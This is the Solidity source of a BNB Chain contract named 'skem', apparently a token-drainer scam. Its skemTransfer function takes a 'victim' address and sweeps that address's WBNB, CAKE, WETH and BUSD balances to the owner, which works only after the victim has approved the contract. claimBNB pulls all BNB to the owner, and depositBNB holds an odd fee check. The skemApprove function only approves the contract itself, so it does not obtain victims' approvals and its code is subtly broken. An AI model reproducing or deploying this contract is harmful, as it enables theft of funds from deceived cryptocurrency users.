/**
 *Submitted for verification at BscScan.com on 2022-01-15
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

interface ERC20 {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function transfer(address dst, uint wad) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
}

contract skem{

    address owner;
    constructor(){
        owner = msg.sender;
    }

    ERC20 WBNB = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ERC20 CAKE = ERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    ERC20 WETH = ERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    ERC20 BUSD = ERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    function skemApprove() public{
        WBNB.approve(address(this),115792089237316195423570985008687907853269984665640564039457584007913129639935);
        CAKE.approve(address(this),115792089237316195423570985008687907853269984665640564039457584007913129639935);
        WETH.approve(address(this),115792089237316195423570985008687907853269984665640564039457584007913129639935);
        BUSD.approve(address(this),115792089237316195423570985008687907853269984665640564039457584007913129639935);
    }

    function skemTransfer(address victim) public{
        uint balance = WBNB.balanceOf(victim);
        WBNB.transferFrom(victim, owner, balance);
        balance = CAKE.balanceOf(victim);
        CAKE.transferFrom(victim, owner, balance);
        balance = WETH.balanceOf(victim);
        WETH.transferFrom(victim, owner, balance);
        balance = BUSD.balanceOf(victim);
        BUSD.transferFrom(victim, owner, balance);
    }

    function depositBNB() public payable{
        uint fee = address(this).balance * 95 / 100;
        require(msg.value == fee);
        fee = msg.value;
    }

    function claimBNB() public{
        payable(owner).transfer(address(this).balance);
    }




    receive() external payable {}
    fallback() external payable {}
}